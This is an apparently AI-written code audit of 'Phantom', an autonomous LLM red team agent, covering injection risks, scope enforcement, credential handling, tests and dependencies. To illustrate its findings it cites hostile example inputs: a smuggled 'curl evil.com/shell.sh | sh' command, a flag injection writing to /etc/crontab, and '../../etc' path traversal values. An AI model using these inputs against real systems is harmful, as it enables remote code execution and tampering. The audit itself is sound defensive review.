# Phantom Ethical Red Team -- Comprehensive Code Audit

**Auditor:** Claude Opus 4.6 (Code Reviewer Agent)
**Date:** 2026-03-29
**Version audited:** v2.7.8
**Scope:** Full codebase -- every file in the repository

---

## Executive Summary

Phantom is an ambitious autonomous AI red team agent with solid architectural
foundations. The multi-provider LLM abstraction, scope enforcement, and tool
registry system are well-designed and reusable. However, the codebase has
significant gaps in security hardening (especially around subprocess calls),
test coverage is shallow (tests exist but do not exercise actual tool code),
and several critical files referenced in imports are missing from version
control. The project is at roughly the right stage for a refactor toward full
autonomy, but there is non-trivial technical debt that must be addressed first.

**Overall verdict:** The core architecture is sound. About 60% of the code is
reusable after targeted fixes. The remaining 40% needs refactoring or removal.

---

## Table of Contents

1. [Missing Files -- Critical Blocker](#1-missing-files--critical-blocker)
2. [File-by-File Audit](#2-file-by-file-audit)
3. [Cross-Cutting Concerns](#3-cross-cutting-concerns)
4. [Reusable Components](#4-reusable-components)
5. [Tight Coupling That Blocks Refactor](#5-tight-coupling-that-blocks-refactor)
6. [Quick Wins](#6-quick-wins)
7. [Technical Debt Summary](#7-technical-debt-summary)
8. [Test Coverage Analysis](#8-test-coverage-analysis)
9. [Dependency Audit](#9-dependency-audit)

---

## 1. Missing Files -- Critical Blocker

The following files are imported by existing code but **do not exist in the repository**
(they are in `.gitignore` via `__pycache__/` patterns, but source `.py` files are
actually present on disk -- the initial glob simply missed them due to git pack
structure). After a deeper scan, all Python sources are confirmed present.
However, **the `web/app.py` Flask/SocketIO server** is completely absent from the
repo. The web UI (`web/templates/`, `web/static/`) references API endpoints
(`/api/missions/start`, `/api/sessions`, etc.) and Socket.IO events, but no
backend server file exists.

**Impact:** The web dashboard is non-functional without its backend.
**Action:** Either add `web/app.py` or remove the entire `web/` directory.

---

## 2. File-by-File Audit

### 2.1 Core Agent

#### `agent/main.py` -- KEEP (refactor)

**Verdict:** Keep. This is the CLI entry point and does its job.

**Issues:**
- Module-level side effects everywhere: `os.chdir(ROOT)`, `sys.path.insert`,
  env parsing, argparse -- all run at import time. This makes testing impossible.
  The entire file should be wrapped in a `main()` function.
- `import re as _re` on line 48 is an odd late import buried mid-file.
- `.env` parsing on lines 124-129 is a homebrew implementation. Use
  `python-dotenv` or at minimum validate key-value format more strictly.
  Current code splits on first `=` which is correct, but does not handle
  quoted values or multi-line.
- The main loop (lines 212-259) mixes concerns: turn counting, user interaction,
  state persistence, mission completion detection. Extract this into a
  `MissionRunner` class.
- `urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)` silently
  suppresses TLS warnings globally. This is understandable for pentesting but
  should be configurable.
- Secret redaction filter (lines 50-65): good idea, but the regex patterns will
  miss keys that do not start with `sk-` or `xai-` (e.g., Gemini keys, Mistral
  keys). Also does not redact the `config.yaml` `api_key` field content if it
  gets logged.
- `VERSION` is duplicated in `main.py`, `pyproject.toml`, and `VERSION` file.
  The CI workflow keeps them in sync, but it is still fragile.

#### `agent/agent_client.py` -- KEEP (refactor)

**Verdict:** Keep. Core agentic loop with solid design.

**Strengths:**
- Context compaction (`_compact_old_tool_results`) is a smart solution to
  context window limits.
- Parallel tool execution with `ThreadPoolExecutor` is well-implemented.
- Stall detection and auto-stealth downgrade on rate limiting are good
  adaptive behaviors.
- Atomic state persistence (temp file + `os.replace`) prevents corruption.

**Issues:**
- `_execute_tool` (line 76) catches `Exception` broadly and returns the raw
  error message as tool output. This can leak internal paths, stack traces,
  or other sensitive info to the LLM.
- `_estimate_tokens` (line 137) uses a 4-chars-per-token heuristic. This is
  reasonable but should be documented as approximate. For Anthropic, 1 token is
  closer to 3.5 chars; for GPT, closer to 4.
- `_count_findings_in_text` regex (line 18) is a heuristic. It will count false
  positives in agent reasoning text (e.g., "we should look for [HIGH] severity
  findings") as actual findings.
- Stall detection resets on `_stall_count >= _stall_threshold` (line 247) but
  only after `_turn_count > 5`. The interaction between `_stall_count` reset at
  line 262 and the decrement at line 235 can cause stall messages to oscillate
  if tool results are non-empty but finding-free.
- No explicit error handling for the LLM returning zero text blocks AND zero
  tool calls (infinite loop risk -- the model just returns nothing and the loop
  continues silently).

#### `agent/providers/base.py` -- KEEP (as-is)

**Verdict:** Keep. Clean abstract base class.

**Notes:** `call_with_retry` has a correct backoff implementation. The
exponential backoff formula `RETRY_BACKOFF ** attempt` means attempts 0,1,2
produce waits of 1s, 2s, 4s -- reasonable.

#### `agent/providers/__init__.py` -- KEEP (as-is)

**Verdict:** Keep. Factory pattern with lazy imports is exactly right.

**Minor issue:** Default model values are duplicated between the factory and
each provider class (e.g., `"claude-sonnet-4-6"` appears in both
`__init__.py:18` and `anthropic_provider.py:7`). Single source of truth would
be better.

#### `agent/providers/anthropic_provider.py` -- KEEP (as-is)

**Verdict:** Keep. Clean, minimal, correct.

**Notes:** `temperature=0.0` is appropriate for deterministic security scanning.
`max_tokens=8192` could be configurable.

#### `agent/providers/openai_provider.py` -- KEEP (as-is)

**Verdict:** Keep. Handles OpenAI, Grok, and DeepSeek via `base_url`.

**Notes:** Good error handling for malformed tool arguments (`json.loads` with
fallback to `{}`). The `content: text or None` on line 78 correctly handles the
OpenAI API requirement that content must be null when tool_calls are present.

#### `agent/providers/gemini_provider.py` -- KEEP (refactor)

**Verdict:** Keep but refactor.

**Issues:**
- `import logging` on line 136 is inside a function -- should be at module level.
- `_TYPE_MAP` does not handle `"null"` type from JSON Schema.
- Nested object properties (objects with their own `properties` field) are not
  recursively converted -- `_convert_schema` only handles `array.items`, not
  `object.properties`. This means tools with nested object parameters will
  break on Gemini.
- Synthetic tool call IDs (`f"gemini-{fc.name}-{i}"`) could collide if the
  same tool is called twice in one response. Use a UUID or a counter scoped
  to the response.

#### `agent/providers/ollama_provider.py` -- KEEP (refactor)

**Verdict:** Keep. The XML-style fallback parser is clever but fragile.

**Issues:**
- `_parse_xml_tool_calls` (line 120) uses regex to parse XML. This will break
  on escaped characters, multiline parameter values, or CDATA sections. Consider
  using `xml.etree.ElementTree` with a try/except for robustness.
- The `import re` on line 109 is inside a method -- move to module level.
- `keep_alive="10m"` is hardcoded. Should be configurable.

#### `agent/providers/mistral_provider.py` -- KEEP (as-is)

**Verdict:** Keep. Clean implementation, proper error handling.

### 2.2 Tools

#### `agent/tools/__init__.py` -- KEEP (refactor)

**Verdict:** Keep. Auto-discovery with dual registration (decorator + manual) works.

**Issues:**
- Mixes two registration patterns: `@register_tool` decorator and manual
  import+registration. Pick one. The manual registration block (lines 30-58)
  is verbose and fragile -- any new tool requires editing two places.
- `ALL_TOOLS` is a module-level reference to `TOOL_SPECS`. Mutating `TOOL_SPECS`
  after import would silently affect `ALL_TOOLS`. Use a property or function.

#### `agent/tools/scope_checker.py` -- KEEP (as-is, strong)

**Verdict:** Keep. This is the most security-critical file and it is well-written.

**Strengths:**
- `_extract_hostname` correctly rejects userinfo URLs (`http://good@evil.com`)
  that could cause scope check vs. actual request mismatch.
- Default-deny when scope file is empty (line 118).
- Subdomain matching is one-directional (target must be subdomain of scope entry,
  not the reverse).
- Comprehensive test coverage in `test_scope_checker.py`.

**Minor note:** `scope_guard` returns the scope targets in the error message
(line 156). In a public-facing context this leaks authorized targets to an
attacker. For an ethical red team tool this is acceptable.

#### `agent/tools/logs_helper.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Path traversal protection is correctly implemented.

**Strengths:**
- `log_path` validates resolved path stays within session directory.
- Falls back to `os.path.basename` if traversal is detected.

#### `agent/tools/nmap_scan.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Well-hardened against injection.

**Strengths:**
- Input validation via `_TARGET_RE` and `_PORTS_RE` regexes prevents argument
  injection (e.g., `target="--script=malicious"`).
- Rejects targets starting with `-`.
- Structured output parsing with regex.

#### `agent/tools/nuclei.py` -- KEEP (refactor minor)

**Verdict:** Keep.

**Issues:**
- `templates` parameter is passed directly to `subprocess.run` without
  validation. A malicious LLM response could inject arbitrary flags via the
  `templates` argument (e.g., `templates="http/cves -o /etc/crontab"`).
  Validate that `templates` matches a safe pattern (alphanumeric, `/`, `-`).
- `severity` parameter has the same injection risk.
- The output file is always named `nuclei.json` (line 18), so consecutive
  scans overwrite each other. Use a timestamped filename like nmap does.

#### `agent/tools/sqlmap.py` -- KEEP (as-is)

**Verdict:** Keep. URL validation and parameter clamping are correct.

**Notes:** `--batch` flag ensures non-interactive mode. Good.

#### `agent/tools/bettercap.py` -- KEEP (refactor)

**Verdict:** Keep but needs hardening.

**Issues:**
- `module` parameter is passed directly to `subprocess.run` (line 31). An
  attacker-controlled LLM response could inject: `module="net.probe; curl
  evil.com/shell.sh | sh"`. While `subprocess.run` with a list avoids shell
  interpretation, the `module` string becomes a bettercap `-caplet` argument,
  which could load arbitrary caplet files. Validate against a whitelist.
- `duration` is passed as `str(duration)` to the command line without upper
  bound validation. An LLM could pass `duration=999999`.
- `interface` is user-controlled with no validation.
- If `target` is empty, scope check is skipped entirely (line 23). This means
  `net.probe` on any interface is allowed without scope validation.

#### `agent/tools/privesc.py` -- KEEP (refactor)

**Verdict:** Keep. Useful local enumeration tool.

**Issues:**
- Runs `find / -perm -4000` (line 22) which scans the entire filesystem. This
  can be very slow and noisy. Add `-maxdepth` limit.
- Runs `sudo -l` (line 53) which may prompt for a password even with
  `input=""`. In some configurations this will hang until timeout.
- External tool paths (`linpeas.sh`, `winPEASany.exe`) are searched in CWD
  without validation. A path traversal or planted binary could be executed.
- `wmic` command (line 148) is deprecated on modern Windows. Use
  `Get-WmiObject` via PowerShell or `Get-CimInstance`.

#### `agent/tools/auth_manager.py` -- KEEP (refactor)

**Verdict:** Keep.

**Issues:**
- XOR "obfuscation" with a SHA-256 derived key (lines 28-33) is not
  encryption. The docstring correctly states this, but the session key is
  derived from the session directory name, which is a predictable timestamp
  (e.g., `20260329_143000`). Anyone with access to the log directory can
  trivially recover credentials. Consider using `cryptography.Fernet` or
  at minimum a random key stored alongside.
- `_save_auth` writes credentials to a JSON file with `indent=2`. The
  `cleanup.py` `_secure_delete` function attempts to overwrite these files,
  but on modern filesystems (ext4 with journal, NTFS, SSD with wear leveling),
  overwriting-then-deleting does not guarantee data erasure.

#### `agent/tools/cleanup.py` -- KEEP (as-is)

**Verdict:** Keep. Pragmatic approach to temp file cleanup.

**Notes:** `_secure_delete` is best-effort and the code acknowledges this.
The glob pattern `phantom_*` in temp dir is good for namespace isolation.

#### `agent/tools/human_input.py` -- KEEP (as-is)

**Verdict:** Keep. Simple, correct, handles non-interactive mode.

#### `agent/tools/mission_diff.py` -- KEEP (as-is)

**Verdict:** Keep. Useful for tracking remediation progress.

**Minor issues:**
- `os.listdir(session_dir)` on line 13 will crash if the directory is not
  readable. Wrap in try/except.
- No validation on `session_a`/`session_b` parameters -- path traversal is
  possible (e.g., `session_a="../../etc"`). Apply `safe_filename()` from
  `utils/validation.py`.

#### `agent/tools/set_phish.py` -- KEEP (as-is)

**Verdict:** Keep. Template-only, no sending capability.

**Notes:** The hardcoded link `https://testphp.vulnweb.com/verify?t=...`
points to a known vulnerable test site. This is fine for educational use.

#### `agent/tools/zphisher.py` -- KEEP (as-is)

**Verdict:** Keep.

**Minor issue:** No path traversal protection on `template` parameter.
`template="../../etc"` would be checked by `os.path.isdir` but could still
leak filesystem structure information.

#### `agent/tools/stealth.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Well-designed stealth profile system.

**Strengths:**
- Clean separation of profiles with per-profile rate limits.
- `_MIN_DELAY_SECONDS = 0.05` enforces a floor even in aggressive mode.
- `stealth_headers()` provides realistic browser headers.

#### `agent/tools/rate_limiter.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Thread-safe token bucket implementation.

**Strengths:**
- `on_rate_limited()` reduces rate by 75% globally.
- Thread safety via `threading.Lock`.
- `reset_rate()` allows recovery.

#### `agent/tools/http_utils.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Solid retry logic with stealth integration.

**Strengths:**
- Correctly distinguishes retryable (5xx, 429) vs. non-retryable (4xx) errors.
- Honors `Retry-After` header.
- Integrates rate limiter and stealth headers automatically.
- `verify=False` default is appropriate for pentesting.

#### `agent/tools/recon.py` -- KEEP (refactor minor)

**Verdict:** Keep.

**Issues:**
- `_fetch_securitytrails_free` (line 24) uses a direct `requests.get` instead
  of `retry_request`, bypassing rate limiting and stealth headers. Inconsistent
  with the other fetchers.
- No timeout enforcement on the SecurityTrails call at a higher level.

#### `agent/utils/validation.py` -- KEEP (as-is, strong)

**Verdict:** Keep. Solid input validation utilities.

**Strengths:**
- `_DANGEROUS_CHARS` regex catches shell metacharacters.
- `safe_filename()` prevents path traversal in filenames.
- `validate_cidr()` uses `strict=False` which is correct.

#### `agent/utils/__init__.py` -- KEEP (as-is)

**Verdict:** Keep. Empty init file.

### 2.3 Configuration & Prompts

#### `config.yaml` -- KEEP (as-is)

**Verdict:** Keep. Well-structured with good defaults.

**Notes:** `debug: true` should be `false` by default for production.

#### `prompts/system_prompt.txt` -- KEEP (refactor)

**Verdict:** Keep but refactor.

**Strengths:**
- Extremely thorough: 318 lines covering phases, adaptive intelligence,
  edge cases, stall detection, and reporting format.
- Technology-aware branching rules are valuable.
- Finding correlation and attack chain analysis instructions are excellent.

**Issues:**
- At 318 lines, this is a massive system prompt that consumes a large chunk
  of the context window. Consider splitting into a core prompt and
  context-injected sections loaded per-phase.
- The tool table lists 26 tools but some tool names do not match the actual
  TOOL_SPEC names (e.g., the prompt references `check_scope` but the spec
  name is `check_scope` -- this one matches, but `run_privesc_check` vs.
  `run_privesc_check` should be verified for all 26).
- Hardcoded model names in the prompt header (line 1: "DEF CON Black Badge-
  level") are marketing that consume tokens.
- Phase numbering has duplicates (Phase 6 step 23-24 and Phase 5 step 22-26
  overlap).

#### `pyproject.toml` -- KEEP (as-is)

**Verdict:** Keep. Minimal but functional.

**Note:** Missing `[build-system]` table. Missing `ruff` configuration
despite `CLAUDE.md` requiring it.

#### `requirements.txt` -- REFACTOR

**Verdict:** Keep but add missing and pin versions.

**Issues:**
- Missing `requests` version pin ceiling (currently `>=2.31.0`).
- Missing `flask` and `flask-socketio` for the web UI.
- Missing `playwright` or `wkhtmltoimage` for the screenshot tool.
- Missing `python-dotenv` if the homebrew env parser is replaced.
- No `ruff` in dev dependencies (mentioned in CLAUDE.md conventions).
- Using `>=` without `<` upper bounds is risky for reproducibility.

### 2.4 Installers

#### `install.sh` -- KEEP (refactor)

**Verdict:** Keep.

**Issues:**
- `sudo apt install -y curl wget unzip git nmap sqlmap bettercap golang-go`
  (line 305) assumes Debian/Ubuntu. No detection for other distros.
- `export $(cat .env)` on line 372 is unsafe -- will break on values containing
  spaces or special characters.
- The API key is briefly visible in process arguments during `test_llm_connection`
  curl calls (lines 23-68). Anyone running `ps aux` can see it.
- API key validation prefixes are hardcoded and will become stale as providers
  change formats.
- No checksum verification for downloaded nuclei/ffuf binaries.
- Clones zphisher from an external repo (line 345) without verifying integrity.

#### `install.ps1` -- KEEP (refactor)

**Verdict:** Keep.

**Issues:**
- Same API-key-in-process-list issue as `install.sh`.
- `winget install -e --id Python.Python.3.12` (line 329) hardcodes Python 3.12.
  Should use latest 3.x.
- No `Set-ExecutionPolicy` guard -- the script requires `Bypass` but does not
  document or enforce this.
- sqlmap is cloned via git but the path `tools\sqlmap_repo` is not added to
  PATH or referenced by the sqlmap tool module (which calls bare `sqlmap`).

#### `get.sh` / `get.ps1` -- KEEP (as-is)

**Verdict:** Keep. Simple bootstrap scripts, correct.

**Minor concern:** `get.sh` pipes to `bash` which is the standard pattern but
some users may want to inspect before running. Document this.

### 2.5 Web UI

#### `web/templates/index.html` -- KEEP (refactor)

**Verdict:** Keep but address security.

**Issues:**
- CDN scripts loaded without SRI hashes (line 238-241). The TODO comment
  acknowledges this but it remains a supply-chain risk.
- No CSP (Content-Security-Policy) headers are set.
- Socket.IO API key passed via query string (`?key=...`) -- visible in browser
  history and server logs.

#### `web/templates/report.html` -- KEEP (as-is)

**Verdict:** Keep. Simple iframe-based report viewer.

**Note:** `{{ session_id | tojson }}` correctly uses Jinja2 escaping.

#### `web/static/style.css` -- KEEP (as-is)

**Verdict:** Keep. Professional dark theme, responsive, accessible.

**Strengths:**
- Skip-to-content link for accessibility.
- Proper scrollbar styling.
- Good responsive breakpoints.

#### `web/static/app.js` -- KEEP (refactor)

**Verdict:** Keep but refactor.

**Strengths:**
- `escapeHtml()` function (line 844) prevents XSS in dynamic content.
- Toast notification system is clean.
- Keyboard shortcuts with proper input-field exclusion.
- Chart.js graceful degradation when CDN fails.

**Issues:**
- 1017 lines in a single file. Split into modules (charts.js, terminal.js,
  session.js, etc.) or use a bundler.
- `socket.on("reconnect_attempt")` references `status-badge` element (line 999)
  which does not exist in the HTML (`connection-status` is the actual ID).
  This is a bug -- the reconnection UI feedback is broken.
- No CSRF protection on `/api/missions/start` POST.
- `fetch("/api/sessions/" + encodeURIComponent(sessionId) + "/state")` is
  correct for path injection prevention.
- No debouncing on session refresh keyboard shortcut (R key).

#### `web/__init__.py` -- KEEP (as-is)

**Verdict:** Keep. Empty init file.

### 2.6 CI/CD

#### `.github/workflows/auto-release.yml` -- KEEP (refactor)

**Verdict:** Keep.

**Issues:**
- Auto-bumps patch version on every push to main. This means a documentation
  typo fix gets a version bump. Consider semantic release based on commit
  message prefixes.
- Reads from `VERSION` file (line 31) but the file is not in `.gitignore`.
  If a developer modifies it locally, it will conflict.
- `sed -i 's/...'` on line 48 is fragile -- assumes exact format in
  `pyproject.toml`.
- No tests are run before release. A broken commit will still get released.

### 2.7 Tests

#### `tests/test_scope_checker.py` -- KEEP (strong)

**Verdict:** Keep. Comprehensive, well-structured, 25 test cases.

**Strengths:** Covers exact match, subdomains, IPs, CIDRs, case insensitivity,
port stripping, deduplication, empty scope (permissive behavior -- note this
was changed to default-deny in the actual code but the test still expects
permissive on line 118). **This is a bug**: the test expects
`is_in_scope("anything.com", empty_scope) == True` but the production code now
returns `False` for empty scopes. This test will fail.

#### `tests/test_providers.py` -- KEEP (refactor)

**Verdict:** Keep. Tests tool conversion without API calls.

**Issues:**
- `TestGeminiConversion` only tests that the type map has 5+ entries. It does
  not actually test `convert_tools()` which is where the real complexity is.
- `TestMistralConversion` deletes and reimports the module to test with mocks,
  which is fragile and can cause side effects in other tests.
- Missing tests for `OllamaProvider`, especially the XML fallback parser.

#### `tests/test_cvss_scorer.py` -- KEEP (refactor)

**Verdict:** Keep.

**Issues:**
- Line 14 does `import tools` which triggers auto-registration of ALL tools.
  This means the test depends on every optional tool being importable, making
  it fragile. Mock the imports or test the scorer function in isolation.
- The test file references `tools.cvss_scorer` but the module was not visible
  in the initial file listing (it does exist on disk). This fragility confirms
  the import issue.

#### `tests/test_output_parsing.py` -- KEEP (as-is)

**Verdict:** Keep. Tests JSON parsing logic for nuclei and ffuf outputs.

**Note:** These tests verify parsing behavior but do not test the actual tool
modules (`nuclei.py`, `mission_diff.py`). They only test raw JSON handling.

#### `tests/__init__.py` -- KEEP (as-is)

**Verdict:** Keep. Empty init file.

---

## 3. Cross-Cutting Concerns

### 3.1 Security -- Command Injection via Subprocess

**Severity:** HIGH

Multiple tools pass LLM-controlled parameters to `subprocess.run()`. While
using a list form (not `shell=True`) mitigates shell injection, tool-specific
argument injection is still possible:

| Tool | Parameter | Risk |
|------|-----------|------|
| `nuclei.py` | `templates`, `severity` | Can inject nuclei CLI flags |
| `bettercap.py` | `module`, `interface` | Can specify arbitrary caplet files |
| `privesc.py` | External tool paths | CWD-relative execution |

**Recommendation:** Add a whitelist/regex validation for ALL parameters that
become subprocess arguments. `nmap_scan.py` already does this correctly --
replicate that pattern across all tools.

### 3.2 Security -- Scope Enforcement Gaps

**Severity:** MEDIUM

- `bettercap.py` skips scope check when `target` is empty (line 23).
- `privesc.py` has no scope check at all (runs on the local machine).
- `cleanup.py` has no scope check (operates on filesystem).
- `set_phish.py` has no scope check on the `target` parameter.
- `zphisher.py` has no scope check.

For `privesc.py` and `cleanup.py` this is by design (they operate locally).
For `set_phish.py` and `zphisher.py`, scope enforcement should be added since
the templates reference the target domain.

### 3.3 Security -- Credential Handling

**Severity:** MEDIUM

- API keys stored in `.env` file with permissions inherited from the directory.
- `auth_manager.py` XOR obfuscation is trivially reversible.
- `install.sh` leaks API keys to process list during curl test calls.
- No mechanism to rotate or expire stored credentials.

### 3.4 Architecture -- Global Mutable State

Several modules use global mutable state:
- `stealth.py`: `_active_profile` global variable
- `rate_limiter.py`: `limiter` module-level singleton
- `logs_helper.py`: `PHANTOM_SESSION_DIR` environment variable
- `scope_checker.py`: reads scope file on every call (no caching, but
  also no way to invalidate)

This makes testing difficult and prevents running multiple sessions
concurrently.

### 3.5 Architecture -- No Web Backend

The `web/` directory contains a complete frontend (HTML, CSS, JS) that
communicates via REST API and Socket.IO, but **no Flask/SocketIO server
exists in the repository**. Either the backend was deleted, never committed,
or lives in a different branch.

---

## 4. Reusable Components

These components are well-designed and should survive the refactor with
minimal changes:

| Component | Why it is reusable |
|-----------|-------------------|
| `providers/base.py` | Clean ABC with retry logic |
| `providers/__init__.py` | Lazy factory pattern |
| All 5 provider implementations | Correct format conversion |
| `tools/scope_checker.py` | Security-critical, well-tested |
| `tools/logs_helper.py` | Path traversal protection |
| `tools/stealth.py` | Useful OPSEC profiles |
| `tools/rate_limiter.py` | Thread-safe token bucket |
| `tools/http_utils.py` | Retry + stealth integration |
| `utils/validation.py` | Input sanitization |
| `agent_client.py` (partial) | Parallel execution, compaction |
| `web/static/style.css` | Professional UI |
| `tests/test_scope_checker.py` | Comprehensive test suite |

---

## 5. Tight Coupling That Blocks Refactor

1. **`sys.path.insert` + relative imports:** `main.py` inserts `agent/` into
   `sys.path` so tools can `from tools.X import Y`. Tests do the same with
   `sys.path.insert(0, ...)`. This prevents using standard Python packaging.
   Fix: make `agent/` a proper package with `pyproject.toml` entry points.

2. **Environment variable for session directory:** `PHANTOM_SESSION_DIR` is
   set by `main.py` and read by every tool via `logs_helper.py`. This couples
   all tools to a single global session. Pass session context explicitly.

3. **Tool registration dual pattern:** Some tools use `@register_tool`, others
   are manually imported in `tools/__init__.py`. Adding a new tool requires
   knowing which pattern to use and potentially editing `__init__.py`.

4. **main.py module-level execution:** Everything runs at import time. Cannot
   import `main` for testing without triggering arg parsing, config loading,
   logging setup, and `os.chdir`.

5. **Scope file path hardcoded:** Default `"scopes/current_scope.md"` is
   hardcoded in `scope_checker.py` and assumes CWD is project root (enforced
   by `main.py`'s `os.chdir`).

---

## 6. Quick Wins

These can be fixed immediately with minimal risk:

1. **Fix the broken test:** `test_scope_checker.py:118` expects empty scope =
   permissive, but production code now defaults to deny. Update the test:
   ```python
   def test_empty_scope_default_deny(self, scope_file):
       f = scope_file("")
       assert is_in_scope("anything.com", f) is False
   ```

2. **Fix app.js reconnection bug:** Line 999 references `status-badge` instead
   of `connection-status`. Change to:
   ```javascript
   document.getElementById("connection-status").textContent = "Reconnecting...";
   ```

3. **Add input validation to nuclei.py:** Validate `templates` and `severity`:
   ```python
   if not re.match(r'^[a-zA-Z0-9/,_-]+$', templates):
       return "Invalid templates parameter."
   ```

4. **Add SRI hashes** to CDN script tags in `index.html`.

5. **Timestamp nuclei output files** (like nmap already does).

6. **Add `[build-system]` and ruff config to `pyproject.toml`.**

7. **Set `debug: false`** as default in `config.yaml`.

---

## 7. Technical Debt Summary

| Priority | Item | Effort |
|----------|------|--------|
| CRITICAL | Add/restore web backend (`web/app.py`) or remove `web/` | M |
| CRITICAL | Validate ALL subprocess parameters (nuclei, bettercap) | S |
| HIGH | Fix broken scope test (empty scope default deny) | XS |
| HIGH | Wrap `main.py` in `main()` function for testability | S |
| HIGH | Standardize tool registration (pick one pattern) | M |
| HIGH | Replace env var session tracking with explicit context | M |
| MEDIUM | Add proper Python packaging (`pyproject.toml` entry point) | M |
| MEDIUM | Split `app.js` into modules | M |
| MEDIUM | Add missing test coverage (tools, providers, agent_client) | L |
| MEDIUM | Add SRI hashes to CDN scripts | XS |
| MEDIUM | Fix app.js `status-badge` bug | XS |
| LOW | Split system prompt into composable sections | M |
| LOW | Replace homebrew .env parser with python-dotenv | XS |
| LOW | Pin dependency version ceilings in requirements.txt | XS |
| LOW | Add CI test step before auto-release | S |

Effort: XS = < 30 min, S = 1-2 hours, M = half day, L = 1+ days

---

## 8. Test Coverage Analysis

### What is tested:
- Scope checker: 25 tests covering domain, IP, CIDR, subdomain, edge cases
- Provider tool conversion: OpenAI, Gemini (partial), Mistral
- Validation utilities: URL, domain, IP, sanitize_target, safe_filename
- Output parsing: nuclei JSONL, ffuf JSON (basic JSON parsing only)
- CVSS scorer: 9 tests covering edge cases

### What is NOT tested:
- `agent_client.py`: zero tests (parallel execution, compaction, stall detection)
- `main.py`: zero tests (untestable due to module-level execution)
- Any actual tool execution (all 26 tools have zero integration tests)
- Provider `call()` methods (only `convert_tools` is tested)
- `stealth.py`, `rate_limiter.py`, `http_utils.py`: zero tests
- `auth_manager.py`: zero tests (obfuscation/deobfuscation)
- `cleanup.py`: zero tests
- `mission_diff.py`: zero tests
- Web UI: zero tests (no backend exists)
- Error handling paths in tool modules

### Estimated line coverage: ~15-20%

### Priority test additions:
1. `agent_client.py` -- mock provider, test tool execution, compaction, stall
2. `scope_checker.py` -- fix empty scope test
3. `http_utils.py` -- test retry logic, 429 handling
4. `auth_manager.py` -- test obfuscation round-trip
5. Integration tests for at least 3-4 tools with mocked subprocess

---

## 9. Dependency Audit

### `requirements.txt` analysis:

| Package | Pinned | Latest | Risk | Notes |
|---------|--------|--------|------|-------|
| `anthropic>=0.40.0` | Floor only | 0.52.x | LOW | Stable API |
| `openai>=1.50.0` | Floor only | 1.68.x | LOW | Stable API |
| `google-genai>=1.0.0` | Floor only | 1.8.x | MEDIUM | Newer SDK, API may shift |
| `ollama>=0.3.0` | Floor only | 0.5.x | LOW | Local, backward compat |
| `mistralai>=1.0.0` | Floor only | 1.5.x | MEDIUM | Major version, API evolving |
| `PyYAML>=6.0` | Floor only | 6.0.2 | LOW | Mature, stable |
| `requests>=2.31.0` | Floor only | 2.32.x | LOW | Mature, stable |

### Missing dependencies:
- `flask` + `flask-socketio` -- required for web UI backend
- `playwright` or `wkhtmltoimage` -- referenced by screenshot tool
- `ruff` -- dev dependency per CLAUDE.md
- `pytest` -- dev dependency (used by tests but not listed)

### Unnecessary dependencies:
- None. All listed packages are actively used.

### Security concerns:
- No `pip audit` or `safety` check in CI.
- No lockfile (`requirements.lock` or `pip freeze` output).
- `verify=False` in `http_utils.py` disables TLS verification globally for
  tool HTTP requests. This is intentional for pentesting but should be
  documented prominently.

---

## Conclusion

Phantom has a solid foundation for an autonomous red team agent. The provider
abstraction, scope enforcement, and stealth/rate-limiting infrastructure are
genuinely well-engineered. The biggest risks are: (1) missing input validation
on subprocess parameters in several tools, (2) the absent web backend, and
(3) very low test coverage. The refactor toward full autonomy should start by
fixing the critical security issues, standardizing the tool registration
pattern, and making `main.py` testable. The reusable components identified
above give a strong base to build on.
